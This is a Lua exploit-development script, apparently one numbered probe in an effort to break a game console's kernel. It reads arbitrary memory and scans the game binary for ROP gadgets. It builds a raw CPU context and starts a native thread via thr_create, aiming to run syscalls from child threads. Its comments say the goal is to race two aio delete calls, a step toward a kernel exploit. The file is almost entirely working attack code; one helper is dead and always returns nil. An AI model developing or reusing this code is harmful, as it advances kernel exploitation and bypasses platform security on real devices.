-- CRASH_CLASS: HIGH
-- PROBE 712a: issue a syscall from a native thr_create child, via the loader's
-- own syscall stub address instead of a guessed libkernel GOT slot.
--
-- Context: 129b proved native.fcall_with_rax(syscall.pipe.fn_addr, N) performs
-- syscall N from Lua. 520a tried to run a syscall from a child and died, but it
-- used a guessed address taken from a libc GOT slot. The loader itself knows
-- the real stub address, and tostring(syscall.pipe) prints it.
--
-- If a child can perform a syscall, two children can perform the aio delete at
-- the same time, which is the one thing the Lua-side harness cannot do (509b:
-- two Lua threads issuing syscalls kills the process).
--
-- Layout copied from 156d (the only confirmed working child): magic +0x108 =
-- 0x480, flags +0x0D0 = 0, type +0x110 = 0x10000, CS +0x0C0 = 0x43, RIP +0x0E0,
-- RSP +0x0F8, SS +0x100 = 0x3B, rdi..r15 at +0x048..+0x0B8.

print("=== PROBE 712a: syscall from a native child ===")
print("")

local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v) return string.format("0x%X", to_num(v)) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local pipe_str = tostring(syscall.pipe)
print("[A] " .. pipe_str:gsub("\n"," | "))
local fn = pipe_str:match("fn_addr:%s*(0x[0-9a-fA-F]+)")
local fn_addr = fn and tonumber(fn,16) or nil
if not fn_addr then
    local f2 = pipe_str:match("(0x%x+)$")
    fn_addr = f2 and tonumber(f2,16) or nil
end
print("[A] fn_addr=" .. tostring(fn_addr and string.format("0x%X",fn_addr) or "nil"))
if not fn_addr then print("[A] no stub address; aborting") return end

print("[A] parent fcall_with_rax(getpid)=" .. tostring(to_num(native.fcall_with_rax(fn_addr, 20))))

local sc_mmap = make_syscall(477)
local page = 0x4000
local _, marker = pcall(function() return sc_mmap(uint64(0), uint64(page), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
local _, stack_base = pcall(function() return sc_mmap(uint64(0), uint64(page*4), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
local m = to_num(marker)
local sb = to_num(stack_base)
print("[A] marker=" .. q(m) .. " stack=" .. q(sb))
if m == 0 or sb == 0 then print("[A] mmap failed") return end
zero(m, page)

-- gadgets in eboot (RX, readable): mov [rdi],rax; ret  and  jmp $
local eboot, ebase = nil, nil
do
    local info = memory.alloc(0x200)
    wd(info, 0x160)
    local sc593 = make_syscall(593)
    local h = 0
    pcall(function() sc593(uint64(h), uint64(info)) end)
    local lo = rd(info+0x108) or 0
    local hi = rd(info+0x10C) or 0
    ebase = hi*4294967296 + lo
    eboot = ebase + 0x100000
end
print("[A] eboot base=" .. q(ebase))
local function find(pat)
    local p = {}
    for i=1,#pat do p[i]=string.format("%02X", pat[i]) end
    local s = pcall(function() return memory.read_string(eboot, 0x494000) end)
    return nil
end
-- use the same byte scan as 156d but limited and explicit
local function find_bytes(base, size, b1,b2,b3,b4)
    local chunk = 0x4000
    local off = 0
    while off < size do
        local ok, s = pcall(function() return memory.read_string(base+off, chunk) end)
        if not ok then break end
        local i = 1
        while true do
            local a,b,c,d = s:byte(i,i+3)
            if not a or not d then break end
            if a==b1 and b==b2 and c==b3 and d==b4 then return base+off+i-1 end
            i = i + 1
        end
        off = off + chunk - 3
    end
    return nil
end
local mov_rdi = find_bytes(eboot, 0x494000, 0x48,0x89,0x07,0xC3)
local jmp_self = find_bytes(eboot, 0x494000, 0xEB,0xFE,0x90,0x90) or find_bytes(eboot, 0x494000, 0xEB,0xFE,0x90,0x90)
print("[A] mov[rdi],rax;ret=" .. q(mov_rdi or 0) .. " jmp$=" .. q(jmp_self or 0))
if not mov_rdi or not jmp_self then print("[A] gadget missing; aborting") return end

local stack_top = sb + page*4 - 0x100
wq(stack_top, uint64(mov_rdi))
wq(stack_top+8, uint64(jmp_self))

local C = {MAGIC=0x108, FLAGS=0x0D0, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
           RDI=0x048, RSI=0x050, RDX=0x058, RCX=0x060, R8=0x068, R9=0x070, RAX=0x078}
local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx+C.MAGIC, uint64(0x480))
wd(ctx+C.FLAGS, 0)
wq(ctx+C.TYPE, uint64(0x10000))
wq(ctx+C.CS, uint64(0x43))
wq(ctx+C.SS, uint64(0x3B))
wq(ctx+C.RIP, uint64(fn_addr))
wq(ctx+C.RSP, uint64(stack_top))
wq(ctx+C.RDI, uint64(m))
wq(ctx+C.RAX, uint64(20))

local tid_buf = memory.alloc(8)
wq(tid_buf, uint64(0))
local sc_thr_create = make_syscall(430)
print("[B] child: getpid via fn_addr ...")
local ok, rv = pcall(function() return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0)) end)
print("[B] thr_create ok=" .. tostring(ok) .. " rv=" .. tostring(to_num(rv)) .. " tid=" .. q(rq(tid_buf) or 0))
local ts = memory.alloc(16)
wq(ts,0); wq(ts+8,300000000)
pcall(function() make_syscall(240)(uint64(ts), uint64(0)) end)
print("[B] marker=" .. q(rq(m) or 0) .. " alive=" .. tostring(to_num(native.fcall_with_rax(fn_addr, 20))))
